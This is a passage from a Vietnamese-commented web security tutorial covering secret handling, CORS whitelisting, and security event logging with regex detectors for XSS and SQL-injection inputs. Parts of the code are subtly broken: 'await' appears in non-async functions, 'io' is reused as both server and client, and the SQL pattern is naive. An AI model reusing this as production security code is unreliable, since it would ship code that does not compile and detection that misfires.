const JWT_SECRET = 'my-secret-key-123'; // ❌ Nguy hiểm!
const API_KEY = 'sk_live_abc123xyz'; // ❌ Lộ API key

// ✅ CÁCH SỬA: Dùng environment variables
// File: .env
// JWT_SECRET=randomly-generated-secure-key-xyz789
// API_KEY=sk_live_abc123xyz

// Code:
const JWT_SECRET = process.env.JWT_SECRET; // ✅ Đọc từ env
const API_KEY = process.env.API_KEY;

// .gitignore phải có .env để không commit secrets

// ❌ LỖI 7: CORS wildcard trong production
// Vấn đề: Cho phép mọi domain call API
app.use(cors({ origin: '*' })); // ❌ Mọi domain đều gọi được

// ✅ CÁCH SỬA: Whitelist domains cụ thể
app.use(
  cors({
    origin: ['https://yourdomain.com', 'https://app.yourdomain.com'], // ✅ Chỉ cho phép domains này
    credentials: true,
  })
);
```

**Monitoring & Logging (Giám Sát & Ghi Log Bảo Mật):**

```typescript
// ✅ Security Event Logging System
// Mục đích: Phát hiện và theo dõi các hoạt động bất thường

import winston from 'winston'; // Thư viện logging mạnh mẽ

// Cấu hình logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Ghi vào file
    new winston.transports.File({ filename: 'security.log' }),
    // Gửi đến service giám sát (VD: Elasticsearch, Datadog)
    new winston.transports.Http({ host: 'logs.example.com' }),
  ],
});

// 1. Log Failed Login Attempts (Lần Thử Login Thất Bại)
// Phát hiện brute-force attack
function logFailedLogin(email: string, ip: string, timestamp: Date) {
  securityLogger.warn({
    event: 'FAILED_LOGIN',
    email,
    ip,
    timestamp,
    message: `Thử login thất bại: ${email} từ IP ${ip}`,
  });

  // Kiểm tra số lần thử thất bại
  const failedAttempts = await getFailedAttempts(ip, email);

  if (failedAttempts >= 5) {
    securityLogger.error({
      event: 'BRUTE_FORCE_DETECTED',
      email,
      ip,
      attempts: failedAttempts,
      message: `⚠️ Phát hiện brute-force: ${failedAttempts} lần thử từ ${ip}`,
    });

    // Block IP tạm thời
    await blockIP(ip, 3600); // Block 1 giờ

    // Gửi alert cho security team
    await sendAlert('security@example.com', `Brute-force detected: ${ip}`);
  }
}

// 2. Log Suspicious Activity (Hoạt Động Đáng Ngờ)
// VD: User truy cập nhiều accounts, transfer số tiền bất thường
function logSuspiciousActivity(userId: string, action: string, details: any) {
  securityLogger.warn({
    event: 'SUSPICIOUS_ACTIVITY',
    userId,
    action,
    details,
    timestamp: new Date(),
    message: `Hoạt động đáng ngờ: User ${userId} - ${action}`,
  });

  // VD: Transfer số tiền lớn bất thường
  if (action === 'LARGE_TRANSFER' && details.amount > 100000) {
    // Gửi OTP xác nhận
    await sendOTP(userId);

    // Alert security team
    await sendAlert(
      'security@example.com',
      `Large transfer detected: User ${userId} - $${details.amount}`
    );
  }
}

// 3. Log XSS Attempts (Thử Tấn Công XSS)
// Phát hiện khi user nhập script tags hoặc malicious code
function logXSSAttempt(input: string, ip: string, userId?: string) {
  // Detect script tags hoặc javascript: protocol
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;

  if (xssPattern.test(input)) {
    securityLogger.error({
      event: 'XSS_ATTEMPT',
      ip,
      userId: userId || 'anonymous',
      input: input.substring(0, 200), // Chỉ log 200 ký tự đầu
      timestamp: new Date(),
      message: `⚠️ Phát hiện XSS attempt từ IP ${ip}`,
    });

    // Block IP ngay lập tức
    await blockIP(ip, 86400); // Block 24 giờ

    // Alert admin
    await sendAlert(
      'admin@example.com',
      `XSS attempt from ${ip}: ${input.substring(0, 100)}...`
    );
  }
}

// 4. Log SQL Injection Attempts
function logSQLInjectionAttempt(query: string, ip: string) {
  const sqlPattern = /(\bOR\b|\bAND\b).*=.*|UNION|DROP|DELETE|INSERT/i;

  if (sqlPattern.test(query)) {
    securityLogger.error({
      event: 'SQL_INJECTION_ATTEMPT',
      ip,
      query: query.substring(0, 200),
      timestamp: new Date(),
      message: `⚠️ SQL injection attempt từ ${ip}`,
    });

    await blockIP(ip, 86400);
  }
}

// 5. Log Authentication Events
function logAuthEvent(
  event: string,
  userId: string,
  ip: string,
  success: boolean
) {
  securityLogger.info({
    event: 'AUTH_EVENT',
    type: event, // 'LOGIN', 'LOGOUT', 'TOKEN_REFRESH', 'PASSWORD_CHANGE'
    userId,
    ip,
    success,
    timestamp: new Date(),
    message: `${event}: User ${userId} từ ${ip} - ${
      success ? 'Thành công' : 'Thất bại'
    }`,
  });
}

// 6. Real-time Monitoring Dashboard
// Hiển thị logs real-time cho security team
import { Server } from 'socket.io';

const io = new Server(server);

// Gửi security events real-time đến dashboard
securityLogger.on('data', (logEntry) => {
  if (logEntry.level === 'error' || logEntry.level === 'warn') {
    // Emit đến security dashboard
    io.to('security-room').emit('security-alert', logEntry);
  }
});

// Dashboard component (React)
function SecurityDashboard() {
  const [alerts, setAlerts] = useState<any[]>([]);

  useEffect(() => {
    const socket = io('wss://your-server.com');
    socket.emit('join', 'security-room');

    socket.on('security-alert', (alert) => {
      setAlerts((prev) => [alert, ...prev].slice(0, 100)); // Keep 100 alerts

      // Play sound for critical alerts
      if (
        alert.event === 'BRUTE_FORCE_DETECTED' ||
        alert.event === 'XSS_ATTEMPT'
      ) {
        playAlertSound();
      }
    });

    return () => socket.disconnect();
  }, []);

  return (
    <div className="security-dashboard">
      <h2>🛡️ Security Monitoring Dashboard</h2>
      {alerts.map((alert, i) => (
        <div key={i} className={`alert alert-${alert.level}`}>
          <span className="time">{alert.timestamp}</span>
          <span className="event">{alert.event}</span>
          <span className="message">{alert.message}</span>
        </div>
      ))}
    </div>
  );
}

// 📊 METRICS TRACKING (Theo dõi chỉ số)
interface SecurityMetrics {
  totalRequests: number;
  failedLogins: number;
  xssAttempts: number;
  sqlInjectionAttempts: number;
  blockedIPs: number;
}

// Track metrics theo thời gian
const metrics: SecurityMetrics = {
  totalRequests: 0,
  failedLogins: 0,
  xssAttempts: 0,
  sqlInjectionAttempts: 0,
  blockedIPs: 0,
};

// Gửi metrics đến monitoring service (VD: Prometheus, Grafana)
setInterval(() => {
  sendMetrics('security.metrics', metrics);
  console.log('📊 Security Metrics:', metrics);
}, 60000); // Mỗi phút
```

</details>